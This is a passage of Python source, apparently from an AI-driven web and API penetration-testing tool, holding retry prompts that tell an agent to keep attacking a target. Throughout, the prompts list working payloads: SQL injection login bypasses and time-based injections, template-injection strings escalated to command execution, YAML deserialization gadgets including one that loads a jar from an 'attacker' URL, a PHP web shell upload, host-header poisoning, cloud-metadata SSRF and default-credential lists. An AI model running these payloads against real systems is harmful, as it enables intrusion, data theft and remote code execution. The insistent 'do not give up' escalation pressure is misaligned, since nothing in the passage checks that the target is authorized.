                "web_a03_ssti", "web_a03_path_traversal", "web_a03_xxe",
                "api_injection", "api_ssrf", "api_authz",
                "api_auth", "web_bfla", "api_bfla",
                "web_file_upload", "web_password_reset", "web_session_mgmt",
                "api_mass_assign", "api_data_exposure",
            }
            _RETRY_PROMPTS = {
                "access_control": (
                    "RETRY — Phase '{name}' found 0 vulnerabilities. "
                    "Review your test results below and try DIFFERENT approaches:\n\n"
                    "{evidence}\n\n"
                    "YOU MUST TRY:\n"
                    "1. Forced browsing: /admin, /admin/users, /api/admin, /internal, /debug, "
                    "/manage, /dashboard, /settings, /actuator, /api/v1/users\n"
                    "2. Case-sensitivity routing bypass — for EVERY endpoint that returned 403/401 "
                    "with the lowercase path (e.g. /api/users), re-send the SAME request with "
                    "these case variants — Spring Security, some WAFs and reverse proxies "
                    "match paths case-sensitively while the MVC router does not, causing the "
                    "auth layer to be skipped:\n"
                    "   /API/users, /Api/users, /aPI/users, /API/admin/users, /API/organizations\n"
                    "   /API/licenses, /API/invoices, /API/billing, /API/internal\n"
                    "Also try trailing-slash / path-normalization variants: /api/users/, "
                    "/api/users/./, /api/users/..;/, /api/users;/, /api/users%2f, "
                    "/api/users%2e, /.;/api/users, /api//users. A 200 on any of these when the "
                    "canonical path returned 403 is Critical 'Access Control Bypass via Path "
                    "Normalization / Case Sensitivity'.\n"
                    "3. IDOR: change numeric IDs (id-1, id+1, id=0), try UUIDs, access other users' resources. "
                    "If you find ONE IDOR on a resource, SWEEP the same pattern across EVERY other "
                    "resource endpoint you know of: if /api/users/{{id}} is IDOR, immediately "
                    "test /api/organizations/{{id}}, /api/invoices/{{id}}, /api/licenses/{{id}}, "
                    "/api/subscriptions/{{id}}, /api/billing/{{id}}, /api/orders/{{id}}, "
                    "/api/documents/{{id}} with the same technique. Each one that leaks another "
                    "tenant's data is a separate finding.\n"
                    "4. Cross-role / BFLA re-test — if the auth phase obtained MULTIPLE tokens "
                    "(admin + non-admin), for EVERY admin-only endpoint that returned 200 with "
                    "the admin token, re-send the same request with each non-admin token. A 200 "
                    "on a low-priv token where the endpoint is documented/intended as admin-only "
                    "is 'Broken Function Level Authorization — <role> can access <endpoint>' "
                    "(High/Critical). Also test the reverse: unauthenticated requests to "
                    "endpoints only tested with tokens — 200 without auth = 'Missing "
                    "Authentication'.\n"
                    "5. Method tampering: GET→POST, POST→PUT, GET→DELETE on sensitive endpoints. "
                    "Also test HTTP verbs the framework may tunnel: X-HTTP-Method-Override: "
                    "DELETE, _method=DELETE body param.\n"
                    "6. Parameter pollution: add ?admin=true, ?role=admin, ?debug=1, "
                    "?isAdmin=1, ?bypass=true, ?internal=1\n"
                    "7. Try endpoints you haven't tested yet\n\n"
                    "AUTHENTICATED BUSINESS-LOGIC SURFACE (frequently MISSED):\n"
                    "  Generic crawls miss high-value SaaS / multi-tenant endpoints because they "
                    "live behind explicit UI actions (Settings → Billing, Admin → Audit, etc.) "
                    "rather than being linked from the landing page. After authentication, you "
                    "MUST deliberately probe each of the following surfaces with the auth header "
                    "from any session you have:\n"
                    "    Tenant / org:      /api/orgs, /api/organizations, /api/tenants, "
                    "/api/companies, /api/workspaces, /api/orgs/{{id}}/members, "
                    "/api/orgs/{{id}}/license, /api/orgs/{{id}}/billing\n"
                    "    Subscription:      /api/subscriptions, /api/plans, /api/plans/import, "
                    "/api/billing, /api/invoices, /api/invoices/{{id}}, /api/invoices/template, "
                    "/api/checkout, /api/payment_methods\n"
                    "    Licenses:          /api/licenses, /api/licenses/generate, "
                    "/api/licenses/{{id}}/revoke, /api/keys, /api/api_keys, /api/api_keys/{{id}}\n"
                    "    Sessions:          /api/sessions, /api/users/{{id}}/sessions, "
                    "/api/users/{{id}}/sessions/{{sid}}, /api/auth/sessions, /api/sessions/revoke\n"
                    "    Audit / reports:   /api/audit, /api/audit-log, /api/audit/events, "
                    "/api/reports, /api/reports/generate, /api/reports/revenue, /api/exports, "
                    "/api/export/csv, /api/stats, /api/metrics\n"
                    "    Admin / config:    /api/admin/users, /api/admin/orgs, /api/admin/config, "
                    "/api/admin/feature_flags, /api/settings, /api/config, /api/system\n"
                    "    Workflow / import: /api/workflows, /api/pipelines, /api/imports, "
                    "/api/restore, /api/migrate, /api/templates, /api/forms\n"
                    "    Files / storage:   /api/files, /api/files/{{id}}/download, /api/uploads, "
                    "/api/attachments, /api/documents, /api/exports/{{id}}\n"
                    "    Integrations:      /api/webhooks, /api/integrations, /api/oauth/clients\n"
                    "  For each one that returns 200 — try every test class above (IDOR sweep, "
                    "BFLA cross-role, method tampering). Each multi-tenant leak is a SEPARATE "
                    "Critical 'Cross-Tenant Data Access' finding.\n\n"
                    "STATE-MUTATION INVARIANTS (Session / API-Key / License revocation):\n"
                    "  These are CRITICAL but rarely caught because they need a specific request "
                    "sequence — execute them now if any session-management or key-management "
                    "endpoint exists:\n"
                    "    1. Cross-user revocation (User A creates, User B revokes):\n"
                    "       a. As User A: POST /api/sessions or /api/api_keys → capture id\n"
                    "       b. As User B (or unauth): DELETE /api/sessions/<A's id> "
                    "or /api/api_keys/<A's id>\n"
                    "       c. Re-validate as User A: 200 == User B successfully revoked → "
                    "'IDOR — User can revoke other users' <session/api-key>' (High/Critical).\n"
                    "    2. Self-revocation enforcement: as User A try to revoke User B's token by "
                    "guessing IDs (sid-1, sid+1, UUID brute) — if 200, same finding class.\n"
                    "    3. License / subscription cross-tenant generation: as Tenant A, POST "
                    "/api/licenses/generate with {{\"orgId\": <Tenant B's id>}} — if 200, "
                    "'Cross-Tenant License Generation' (Critical).\n"
                    "    4. Role-validation absence: as a non-admin user, POST to "
                    "/api/admin/users, /api/admin/orgs, /api/admin/config etc. — 200 / 403-with-"
                    "data-leak / 500 not rejecting cleanly = 'Missing Role Validation' (Critical).\n"
                    "    5. Org-switch / impersonation: if the app has a tenant-switch or impersonate "
                    "feature, after switching, replay an old request with the previous tenant's "
                    "context — unchanged tenant scope after switch = 'Impersonation Trail / "
                    "Org-Switch Session Confusion' (High).\n\n"
                    "DO NOT give up. Try at least 3 more approaches."
                ),
                "auth": (
                    "RETRY — Phase '{name}' has NOT completed credential testing yet. "
                    "Review the evidence below and perform credential discovery now:\n\n"
                    "{evidence}\n\n"
                    "YOU MUST TRY (use api_request to POST directly to the login endpoint(s), "
                    "NOT inject_payload — many apps only validate via JSON/REST):\n"
                    "1. Default credentials — try EACH of these pairs:\n"
                    "   admin:admin, admin:password, admin:admin123, admin:123456,\n"
                    "   administrator:administrator, root:root, test:test, guest:guest, user:user\n"
                    "2. Email-format usernames — try BOTH admin AND non-admin tenant roles. "
                    "Finding a non-admin credential is as valuable as finding admin, because a "
                    "low-priv token is required to prove BFLA/horizontal escalation later:\n"
                    "   Admin-style:   admin@<target-host>:admin123, admin@<target-host>:password,\n"
                    "                  admin@juice-sh.op:admin123, administrator@<target>:password\n"
                    "   Tenant/role:   owner@<target>:password, owner@acme.com:password,\n"
                    "                  customer@<target>:password, manager@<target>:password,\n"
                    "                  member@<target>:password, staff@<target>:password,\n"
                    "                  billing@<target>:password, finance@<target>:password,\n"
                    "                  support@<target>:password, user@<target>:password,\n"
                    "                  licops@<target>:password, operator@<target>:password\n"
                    "   Generic:       test@test.com:test123, admin@example.com:password,\n"
                    "                  demo@demo.com:demo, guest@example.com:guest\n"
                    "   Replace <target-host> with the actual hostname you see in the target URL "
                    "(e.g. if the target is https://resurp.com, try owner@resurp.com, "
                    "customer@resurp.com, etc.). App-specific prefixes you see in JS bundles or "
                    "error messages are high-value guesses.\n"
                    "   IMPORTANT — DO NOT stop after finding ONE working credential. Keep trying "
                    "until you obtain tokens for AT LEAST 2 different roles (one admin + one "
                    "non-admin if possible). Multi-role tokens enable the BFLA cross-role "
                    "re-test in the access-control phase.\n"
                    "3. Parameter-name permutation — if the documented field (e.g. `email`) "
                    "returns a validation error (400 / 'invalid email') on SQLi payloads, RE-SEND "
                    "the SAME payload using alternate identifier names on the SAME endpoint — the "
                    "backend framework often silently accepts them:\n"
                    "   {{\"username\":\"admin' --\",\"password\":\"x\"}}\n"
                    "   {{\"user\":\"admin' --\",\"password\":\"x\"}}\n"
                    "   {{\"login\":\"admin' --\",\"password\":\"x\"}}\n"
                    "   {{\"identifier\":\"admin' --\",\"password\":\"x\"}}\n"
                    "   {{\"user_id\":\"1 OR 1=1\",\"password\":\"x\"}}\n"
                    "   {{\"account\":\"admin' --\",\"password\":\"x\"}}\n"
                    "4. SQL injection auth bypass in the email/username field:\n"
                    "   {{\"email\":\"admin' --\",\"password\":\"x\"}}\n"
                    "   {{\"email\":\"' OR 1=1 --\",\"password\":\"x\"}}\n"
                    "   {{\"username\":\"\\\" OR \\\"1\\\"=\\\"1\",\"password\":\"x\"}}\n"
                    "5. Token manipulation: remove Authorization header, invalid token, JWT alg:none\n"
                    "6. Brute force resistance: send 5+ rapid wrong-password attempts, check for lockout\n\n"
                    "A successful login (200 + token/session returned) with a guessed password MUST\n"
                    "be reported as 'Default Credentials Accepted: <user>:<pass>' (High severity).\n"
                    "A successful SQLi bypass MUST be reported as 'SQL Injection Authentication\n"
                    "Bypass' (Critical severity). DO NOT give up before testing at least 10 credential pairs."
                ),
                "sqli": (
                    "RETRY — Phase '{name}' found 0 vulnerabilities. "
                    "Review your test results below and try DIFFERENT approaches:\n\n"
                    "{evidence}\n\n"
                    "CRITICAL — PARAMETER-NAME PERMUTATION:\n"
                    "If your SQLi payloads on the documented params returned VALIDATION-STYLE "
                    "rejections (400 Bad Request, 'IllegalArgumentException', 'Invalid or used X', "
                    "schema / type errors) rather than a SQL error or a successful query, the "
                    "documented param is GATED by validation BEFORE reaching the DB — but the "
                    "backend framework (Spring / Express / Flask) will often silently accept "
                    "OTHER param names on the SAME endpoint that flow STRAIGHT to a SQL query.\n"
                    "YOU MUST re-send the SAME payload to the SAME endpoint with these alternate "
                    "names BEFORE concluding the endpoint is safe:\n"
                    "  • identifier fields:  email, username, user, login, account, user_id, id\n"
                    "  • lookup fields:      q, query, search, name, value, key, filter\n"
                    "  • password-reset specifically: try email AND username AND user_id as the\n"
                    "    subject field, even if the UI only sends `token` + `password`.\n"
                    "A DIFFERENT response signature on an alternate name (500 with SQL error, 200 "
                    "success, different body snippet) is a STRONG signal — pivot and fuzz that "
                    "param with SQLi payloads.\n\n"
                    "YOU MUST ALSO TRY:\n"
                    "1. Use baseline_value with fuzz_parameter — without it, payloads like ' won't "
                    "trigger errors in SQL LIKE clauses. Set baseline_value='test'\n"
                    "2. Try DB-specific blind payloads: SLEEP(5), pg_sleep(5), WAITFOR DELAY\n"
                    "3. Try UNION-based: ' UNION SELECT NULL-- with increasing NULLs\n"
                    "4. Try api_request with manually crafted SQL payloads in URL params and body\n"
                    "5. Test DIFFERENT endpoints you haven't tried (login, search, profile, API)\n"
                    "6. Look at error messages for DB type hints (PostgreSQL, MySQL, SQLite, MSSQL)\n\n"
                    "ORDER BY / GROUP BY / column-name injection (frequently missed):\n"
                    "  Quoted SQL injection payloads (' OR 1=1) DO NOT WORK in ORDER BY / GROUP BY "
                    "positions because those clauses don't take quoted strings — they take raw "
                    "column references. If a request has any of these parameter names, treat them "
                    "as a column-name injection point and use UNQUOTED payloads:\n"
                    "    ?sort=    ?order=    ?orderBy=    ?order_by=    ?sortBy=\n"
                    "    ?groupBy=  ?group_by=  ?dir=  ?direction=  ?column=  ?field=\n"
                    "  Unquoted payload set to try (send each via api_request, watch for 5xx / "
                    "SQL error / >3s response / different row count):\n"
                    "    name)--                                  (terminator probe)\n"
                    "    name,(SELECT 1)                          (trailing-expression — should 200)\n"
                    "    name,(SELECT version())                  (UNION-style version disclosure)\n"
                    "    name,SLEEP(3)                            (MySQL time-based)\n"
                    "    name,pg_sleep(3)                         (PostgreSQL time-based)\n"
                    "    1,(CASE WHEN 1=1 THEN SLEEP(3) ELSE 0 END)\n"
                    "    name,(SELECT password FROM users LIMIT 1) (data extraction)\n"
                    "  A 200 with the SLEEP variant taking >3 seconds = CONFIRMED 'SQL Injection in "
                    "ORDER BY <param>' (Critical) even if the body looks normal. Time-based is the "
                    "only signal here — error-based won't fire.\n\n"
                    "Date / period parameter injection (audit logs, revenue reports, range filters):\n"
                    "  Endpoints like /api/audit?from=...&to=...  /api/revenue?period=...  "
                    "/api/reports?date=...  /api/stats?range=...  often pipe the date string into "
                    "a SQL fragment such as date_trunc('day', $1::timestamp) or BETWEEN. Try:\n"
                    "    period = day'); SELECT pg_sleep(3)--      (Postgres date_trunc break-out)\n"
                    "    from   = 2024-01-01' OR SLEEP(3)--        (MySQL inline)\n"
                    "    to     = ',(SELECT version())--           (UNION-style on second arg)\n"
                    "    range  = day,(SELECT password FROM users LIMIT 1)\n"
                    "  Backend usually wraps the value into a quoted SQL literal — break out of the "
                    "quote before injecting. If the wrapping is unquoted (date_trunc accepts an "
                    "interval literal), use the unquoted ORDER BY style above.\n\n"
                    "Export / report endpoints (POST body or query param SQL injection):\n"
                    "  Endpoints like POST /api/export, POST /api/reports/generate, "
                    "GET /api/download?type=...  GET /api/search/csv?q=... that take an "
                    "organization / tenant / project / customer NAME often build the export SQL "
                    "by concatenating that name into a WHERE clause. Try the FULL NAME field "
                    "(not just id), in BOTH JSON body and query string, with these payloads:\n"
                    "    {{\"name\": \"' UNION SELECT NULL,version(),NULL--\"}}\n"
                    "    {{\"name\": \"'; DROP TABLE x; --\"}}        (look for SQL parser error 500)\n"
                    "    ?orgName=' OR 1=1--   ?tenant=' AND SLEEP(3)--\n"
                    "  CSV / XLSX / PDF endpoints are commonly missed because the LLM stops once "
                    "it sees the export 'works' on a benign value. ALWAYS retry with an injection "
                    "payload and inspect the resulting file body for leaked rows or SQL errors.\n\n"
                    "DO NOT give up. Try at least 3 more approaches AND the param-name permutation "
                    "above on any endpoint that returned a validation-style rejection."
                ),
                "xss": (
                    "RETRY — Phase '{name}' found 0 vulnerabilities. "
                    "Review your test results below and try DIFFERENT approaches:\n\n"
                    "{evidence}\n\n"
                    "YOU MUST TRY:\n"
                    "1. Test ALL reflection points: search boxes, URL params, form fields, headers\n"
                    "2. Parameter-name permutation — if the documented param doesn't reflect, "
                    "re-send the payload with these alternate names that backends commonly accept "
                    "on the same endpoint: q, query, search, s, keyword, term, name, value, "
                    "text, msg, message, comment, title, desc, description, returnTo, next, "
                    "redirect, url, callback, debug. A NEW reflection on an alternate name = XSS.\n"
                    "3. Try different encodings: URL-encode, double-encode, HTML entities\n"
                    "4. Try event handlers: <img src=x onerror=alert(1)>, <svg onload=alert(1)>\n"
                    "5. Try DOM-based: check if URL fragments/params are written to innerHTML\n"
                    "6. Try CSP bypass if CSP is present: use existing trusted domains\n"
                    "DO NOT give up. Try at least 3 more approaches."
                ),
                "injection": (
                    "RETRY — Phase '{name}' found 0 vulnerabilities. "
                    "Review your test results below and try DIFFERENT approaches:\n\n"
                    "{evidence}\n\n"
                    "YOU MUST TRY:\n"
                    "1. Different separators: ;, |, &&, ||, `, $(), %0a for command injection\n"
                    "2. Blind techniques: sleep/ping for CMDI, {{7*7}} for SSTI, "
                    "../../etc/passwd for path traversal\n"
                    "3. Parameter-name permutation — for path traversal / LFI / file-read, if the "
                    "documented param returns 'invalid path' / 400, re-send the SAME payload with "
                    "alternate names backends commonly accept: file, path, name, filename, doc, "
                    "document, page, template, view, load, include, read, src, source, asset, "
                    "resource, href. For SSTI/CMDI, try: name, template, view, cmd, command, "
                    "exec, eval, q, input, data. A different response signature on an alternate "
                    "name is a strong signal.\n"
                    "4. Different template engines: Jinja2, Twig, Freemarker, Handlebars\n"
                    "5. Different file targets: /etc/passwd, /etc/hosts, C:\\Windows\\win.ini\n"
                    "6. Try inputs you haven't tested and different encoding/bypass techniques\n\n"
                    "PER-ENGINE SSTI PAYLOAD SWEEP (when reflection is into rendered HTML / PDF / "
                    "email / CSV / docx — anywhere a string ends up in a server-rendered template):\n"
                    "  Trigger this sweep on ANY endpoint that takes a name/title/template/body/"
                    "content/subject/footer field and returns rendered output. Send each engine's "
                    "fingerprint payload as a SEPARATE request and watch for the literal value 49 "
                    "(or 7777777) in the response — that's a CONFIRMED SSTI:\n"
                    "    Jinja2 / Django:    {{7*7}}                        -> expect 49\n"
                    "    Jinja2 deep:        {{7*'7'}}                      -> expect 7777777\n"
                    "    Twig (PHP):         {{7*7}}                        -> expect 49\n"
                    "    Twig deep:          {{7*'7'}}                      -> expect 49 (NOT 7777777)\n"
                    "    Smarty (PHP):       {$smarty.version}              -> expect Smarty version\n"
                    "    Mako (Python):      ${{7*7}}                       -> expect 49\n"
                    "    ERB (Ruby):         <%= 7*7 %>                     -> expect 49\n"
                    "    Velocity (Java):    #set($x=7*7)$x                  -> expect 49\n"
                    "    FreeMarker (Java):  <#assign x=7*7>${{x}}           -> expect 49\n"
                    "    FreeMarker RCE:     <#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ex(\"id\")}}\n"
                    "    Handlebars (JS):    {{#with \"x\"}}{{constructor.constructor(\"return 7*7\")()}}{{/with}}\n"
                    "    Pug (JS):           #{{7*7}}                       -> expect 49\n"
                    "    Razor (.NET):       @(7*7)                         -> expect 49\n"
                    "    Thymeleaf (Java):   __${{7*7}}__::                 -> expect 49\n"
                    "  Two engines distinguish themselves: Jinja2 evaluates 7*'7' to '7777777', "
                    "Twig evaluates it to 49 — use that to fingerprint which engine you hit. "
                    "REPORT each confirmed render as 'Server-Side Template Injection in <field> "
                    "(<engine>)' (Critical) and ALWAYS attempt the per-engine RCE escalation "
                    "(Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}).\n\n"
                    "INSECURE DESERIALIZATION CONTENT-TYPE SWEEP:\n"
                    "  Any endpoint that accepts application/x-yaml, application/yaml, "
                    "application/octet-stream, application/x-java-serialized-object, "
                    "application/x-php-serialized, or a base64-encoded blob in JSON "
                    "({{\"data\":\"gASVDA…\"}}) is a deserialization candidate. Test each with the "
                    "matching gadget. The Plan-Import / Bulk-Import / Workflow / Pipeline / Config-"
                    "Restore / Template-Import endpoints (typically POST /api/*/import) are the "
                    "most common surface — try them ALL even if not in the documented spec:\n"
                    "    PyYAML (Python):     Send Content-Type: application/x-yaml with body:\n"
                    "                           !!python/object/apply:os.system ['sleep 5']\n"
                    "                           !!python/object/apply:subprocess.check_output [['id']]\n"
                    "                           !!python/object/new:os.system ['id']\n"
                    "                         A >5s response = CONFIRMED RCE via PyYAML.\n"
                    "    SnakeYAML (Java):    Same Content-Type, body:\n"
                    "                           !!javax.script.ScriptEngineManager [\n"
                    "                              !!java.net.URLClassLoader [[\n"
                    "                                !!java.net.URL [\"http://attacker/poc.jar\"]\n"
                    "                              ]]\n"
                    "                           ]\n"
                    "                         OR the ScriptEngineFactory loadClass variant — "
                    "                         look for ClassNotFoundException / ScriptException "
                    "                         in 500 responses (still confirms unsafe parse).\n"
                    "    PHP unserialize:     {{\"data\":\"O:8:\\\"stdClass\\\":1:{{s:4:\\\"data\\\";s:4:\\\"PWND\\\";}}\"}}\n"
                    "                         Look for 'unserialize()' warnings in error responses.\n"
                    "    Python pickle:       Send Content-Type: application/octet-stream with body\n"
                    "                         being base64 of: pickle.dumps(__import__('os').system, ...)\n"
                    "                         500 with 'pickle' / '_reconstructor' = unsafe parse.\n"
                    "    Java native:         POST application/x-java-serialized-object with the\n"
                    "                         standard ysoserial CommonsCollections1 payload (or any\n"
                    "                         arbitrary 'aced0005' prefix) — 500 with\n"
                    "                         'ObjectInputStream' / 'readObject' confirms.\n"
                    "    .NET BinaryFormatter: x-www-form-urlencoded body with __VIEWSTATE=AAEAAAD///…\n"
                    "                         (any malformed BinaryFormatter blob) — 500 with\n"
                    "                         'BinaryFormatter' / 'SerializationException'.\n"
                    "  REPORT confirmed exploits as 'Insecure Deserialization in <endpoint> "
                    "(<library>)' (Critical) and any 500 with library-specific error text as "
                    "'Unsafe Deserialization Indicator' (High — partial confirmation, the parser "
                    "is unsafely processing user input even if this specific gadget didn't trigger).\n\n"
                    "VERBOSE-ERROR / STACK-TRACE HARNESS:\n"
                    "  Many real-world findings come not from injection success but from the SERVER'S "
                    "ERROR. Once you've exhausted the payload classes above, deliberately POISON "
                    "every endpoint with malformed input and capture any 5xx body for stack traces, "
                    "framework banners, file paths, internal hostnames, DB schema fragments. Try:\n"
                    "    1. Type confusion:        {{\"id\": []}}, {{\"id\": {{}}}}, {{\"id\": \"abc\"}}\n"
                    "                              when the schema expects integer\n"
                    "    2. Truncated JSON:        '{{\"name\":' (missing closing brace) — many JSON\n"
                    "                              parsers leak parser internals on the failure path\n"
                    "    3. Oversized strings:     {{\"name\": \"A\" * 10000}} for buffer / regex DoS\n"
                    "                              and possible logging stack traces\n"
                    "    4. Encoding tricks:       %00, %0a%0d, \\u0000, raw NULL bytes in path/body\n"
                    "    5. Method tampering:      TRACE / OPTIONS / DEBUG / PROPFIND on every\n"
                    "                              endpoint — TRACE often echoes back internal IPs\n"
                    "    6. Negative / huge numbers: id=-1, id=999999999999999999, id=NaN, id=Infinity\n"
                    "  REPORT each leaked detail as 'Verbose Error Disclosure — <kind>' (Low/Medium):\n"
                    "    - Stack trace with file paths     -> Medium\n"
                    "    - Framework / language banner     -> Low\n"
                    "    - DB error with table / column    -> Medium\n"
                    "    - Internal hostname / IP / CIDR   -> Medium\n"
                    "    - SQL fragment in error body      -> High (also indicates SQLi candidate)\n"
                    "  Each unique leakage is a SEPARATE finding (don't dedupe across endpoints).\n\n"
                    "DO NOT give up. Try at least 3 more approaches."
                ),
                "ssrf": (
                    "RETRY — Phase '{name}' found 0 vulnerabilities. "
                    "Review your test results below and try DIFFERENT approaches:\n\n"
                    "{evidence}\n\n"
                    "YOU MUST TRY:\n"
                    "1. Cloud metadata: http://169.254.169.254/latest/meta-data/\n"
                    "2. Internal probing: http://localhost, http://127.0.0.1, http://[::1]\n"
                    "3. URL params you haven't tested: ?url=, ?redirect=, ?callback=, ?next=\n"
                    "4. Redirect chains: use your own URL that 302-redirects to internal targets\n"
                    "5. Different URL schemes: file://, gopher://, dict://\n"
                    "DO NOT give up. Try at least 3 more approaches."
                ),
                "file_upload": (
                    "RETRY — Phase '{name}' has not proven RCE via file upload. "
                    "Review the evidence below and actually exploit the upload:\n\n"
                    "{evidence}\n\n"
                    "YOU MUST TRY (use api_request or form submission — then fetch the "
                    "uploaded file back with navigate/api_request and inspect the response):\n"
                    "1. Executable extensions: upload .php / .asp / .aspx / .jsp / .jspx / "
                    ".cgi / .pl / .py with benign content and try to hit the returned URL. "
                    "If the server executes it, that's CRITICAL RCE.\n"
                    "2. Double-extension & null-byte bypass: shell.php.jpg, shell.asp;.jpg, "
                    "shell.php%00.jpg, shell.phtml, shell.phar — MIME-check bypass is weak.\n"
                    "3. Content-Type confusion: send Content-Type: image/jpeg but payload is "
                    "<?php system($_GET['c']); ?> — verify execution by fetching ?c=id.\n"
                    "4. Polyglot files: valid PNG/JPEG header + trailing PHP payload; SVG "
                    "with embedded <script>/<foreignObject> for stored XSS.\n"
                    "5. Path traversal in filename: ../../../var/www/html/shell.php, "
                    "..\\..\\webroot\\shell.aspx — can you overwrite files outside the upload dir?\n"
                    "6. Oversized / zip-bomb / nested archive to probe DoS & unsafe unzip.\n"
                    "REPORT: on confirmed execution, emit 'Arbitrary File Upload → RCE' "
                    "(Critical). DO NOT settle for 'upload accepted' without proving execution."
                ),
                "password_reset": (
                    "RETRY — Phase '{name}' has not completed password-reset abuse testing. "
                    "Review the evidence below and test every class below:\n\n"
                    "{evidence}\n\n"
                    "YOU MUST TRY (use only the scan's own email; never hit third-party addresses):\n"
                    "1. Account enumeration: diff the response (body, status, size, timing) "
                    "between a known-valid email and a random one. Any visible diff = enumeration.\n"
                    "2. Host-header poisoning: resend the reset request with "
                    "Host: attacker.evil and X-Forwarded-Host: attacker.evil — if a reset "
                    "link or body comes back referencing attacker.evil, that's account takeover.\n"
                    "3. Token entropy / reuse / expiry: capture a token, request another reset "
                    "and check if the old one still works (no invalidation = bad). Inspect token "
                    "length, charset, predictability.\n"
                    "4. Missing old-password check on the reset completion endpoint — can you "
                    "POST a new password to the reset endpoint without the token, or with a "
                    "guessed/expired token?\n"
                    "5. Parameter-name permutation & SQLi on EVERY identifier field — the UI "
                    "usually sends only {{token, password}} or {{email}}, but the backend often "
                    "accepts MORE fields that flow directly into SQL. For each reset endpoint "
                    "(forgot-password AND reset-password), send each of these as a SEPARATE "
                    "request and watch for 5xx / SQL errors / timing differences:\n"
                    "   {{\"email\":\"' OR 1=1--\"}}\n"
                    "   {{\"username\":\"' OR 1=1--\"}}\n"
                    "   {{\"user\":\"' OR 1=1--\"}}\n"
                    "   {{\"login\":\"' OR 1=1--\"}}\n"
                    "   {{\"identifier\":\"' OR 1=1--\"}}\n"
                    "   {{\"user_id\":\"1 OR 1=1\"}}\n"
                    "   {{\"email\":\"' AND SLEEP(5)--\"}}\n"
                    "   {{\"token\":\"' OR 1=1--\"}}\n"
                    "A 500 / SQL error / >3s response on ANY of these = 'SQL Injection in Password "
                    "Reset <field> Parameter' (Critical). Validation-style rejections "
                    "(IllegalArgumentException / 400 'invalid email') on one field do NOT imply the "
                    "other fields are safe — test each independently.\n"
                    "6. Parameter pollution / JSON smuggling: {{\"email\":[\"victim@x\", \"attacker@y\"]}} "
                    "or CR/LF injection in the email field to split the recipient.\n"
                    "7. Race condition: send 2 reset requests concurrently and see whether both "
                    "tokens validate.\n"
                    "REPORT host-header takeover as 'Password Reset Host Header Injection' "
                    "(High), token reuse as 'Password Reset Token Not Invalidated' (High), "
                    "SQLi in any identifier field as 'SQL Injection in Password Reset' (Critical)."
                ),
                "session_mgmt": (
                    "RETRY — Phase '{name}' has not proven a session-management defect. "
                    "Review the evidence and test each class below with get_cookies / api_request:\n\n"
                    "{evidence}\n\n"
                    "YOU MUST TRY:\n"
                    "1. Session fixation: get the session cookie BEFORE login, log in, get it "
                    "AFTER login, compare. Same value = fixation (High).\n"
                    "2. Cookie flags: for every session/auth cookie, verify HttpOnly, Secure "
                    "and SameSite. Missing flags on an auth cookie are each separate findings.\n"
                    "3. Session in URL: check whether the token appears in any query string, "
                    "fragment, or Location header — leaks via Referer & logs.\n"
                    "4. Logout / privilege change invalidation: change password (or role, if "
                    "possible) and verify the PREVIOUS token stops working. If it still works, "
                    "that's 'Session Not Invalidated on Credential Change' (High).\n"
                    "5. Concurrent-session / token reuse: a stolen token should not survive "
                    "logout — test it. Long-lived JWTs with no exp claim are a finding.\n"
                    "6. Entropy & predictability: assess token length and charset; extremely "
                    "short or sequential tokens are brute-forceable.\n"
                    "DO NOT click the logout button. Inspect via get_cookies, "
                    "get_local_storage and api_request only."
                ),
                "mass_assign": (
                    "RETRY — Phase '{name}' has not confirmed mass assignment. "
                    "Review the evidence and do not stop at 'request accepted' — you must "
                    "GET the resource back and prove the privileged field was persisted:\n\n"
                    "{evidence}\n\n"
                    "YOU MUST TRY (use api_request for every POST/PUT/PATCH):\n"
                    "1. Privilege escalation fields: inject {{\"role\":\"admin\"}}, "
                    "{{\"isAdmin\":true}}, {{\"admin\":1}}, {{\"permissions\":[\"*\"]}}, "
                    "{{\"userType\":\"admin\"}}, {{\"is_staff\":true}} into user-create / "
                    "user-update / register bodies, then GET the resource and confirm.\n"
                    "2. Financial fields: {{\"price\":0}}, {{\"discount\":100}}, "
                    "{{\"balance\":999999}}, {{\"credits\":999999}}, {{\"isPaid\":true}} "
                    "on order/payment/product endpoints.\n"
                    "3. State fields: {{\"verified\":true}}, {{\"active\":true}}, "
                    "{{\"emailVerified\":true}}, {{\"kycStatus\":\"approved\"}}.\n"
                    "4. Ownership takeover: {{\"ownerId\":<other-user>}}, "
                    "{{\"userId\":<other-user>}}, {{\"email\":\"attacker@x\"}}.\n"
                    "5. Schema inference: GET a resource, copy every field name from the "
                    "response, and send them all back in the update body — this often "
                    "surfaces read-only fields the API silently accepts.\n"
                    "REPORT as 'Mass Assignment — Privilege Escalation to admin' (Critical) "
                    "or 'Mass Assignment — Price Tampering' (High) with before/after JSON proof."
                ),
                "data_exposure": (
                    "RETRY — Phase '{name}' has not enumerated excessive data exposure. "
                    "Review the evidence and go deeper — don't stop at 'response looks normal':\n\n"
                    "{evidence}\n\n"
                    "YOU MUST TRY:\n"
                    "1. UI-vs-API diff: for profile/orders/settings, compare what the UI renders "
                    "to what the API returns. Every extra field (password_hash, salt, "
                    "internal_id, ssn, phone, 2fa_secret, apiKey, stripe_customer_id) is a finding.\n"
                    "2. List/search endpoints: /api/users, /api/users?limit=1000, "
                    "/api/search?q=*, /api/admin/users — do unauthenticated or low-priv roles "
                    "retrieve other users' PII?\n"
                    "3. Sensitive-field probe: scan every JSON response you've collected for "
                    "'password', 'hash', 'salt', 'token', 'secret', 'api_key', 'private_key', "
                    "'ssn', 'credit_card', 'cvv', 'pin', 'otp'. Any hit = finding.\n"
                    "4. Verbose errors: trigger errors (bad JSON, missing fields, bad types) "
                    "and capture stack traces, SQL snippets, file paths, hostnames.\n"
                    "5. Debug/introspection endpoints: /api/debug, /actuator/*, /graphql "
                    "with IntrospectionQuery, /api/swagger, /api/openapi — do they leak internal "
                    "schema or config?\n"
                    "6. ID enumeration: for every endpoint that takes an id, sweep a small "
                    "range (id-5 … id+5) and diff the responses — leaking other users' data is "
                    "both BOLA and data exposure.\n"
                    "REPORT each leaked sensitive field/endpoint as its own finding with the "
                    "offending response body as evidence."
                ),
            }
            _PHASE_TO_PROMPT_KEY = {
                "web_a01": "access_control", "api_authz": "access_control",
                "web_bfla": "access_control", "api_bfla": "access_control",
                "web_a07": "auth", "api_auth": "auth",
                "web_a03_sqli": "sqli", "api_injection": "sqli",
                "web_a03_xss": "xss",
                "web_a03_cmdi": "injection", "web_a03_ssti": "injection",
                "web_a03_path_traversal": "injection", "web_a03_xxe": "injection",
